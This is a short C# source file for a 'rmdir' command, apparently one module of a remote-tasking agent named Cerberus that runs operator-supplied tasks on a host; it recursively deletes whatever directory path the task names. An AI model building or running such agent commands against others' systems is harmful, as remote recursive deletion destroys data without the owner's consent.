using Cerberus.Models.Tasks;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cerberus.Commands
{
    public class DeleteDirectory : CerberusCommand
    {
        public override string Name => "rmdir";

        public override string Execute(CerberusTask task)
        {
            if (task.Arguments is null || task.Arguments.Length == 0)
            {
                return "No path provided";
            }

            var path = task.Arguments[0];
            Directory.Delete(path, true);

            if (!Directory.Exists(path))
            {
                return $"{path} deleted";
            }

            return $"Failed to delete {path}";
        }
    }
}
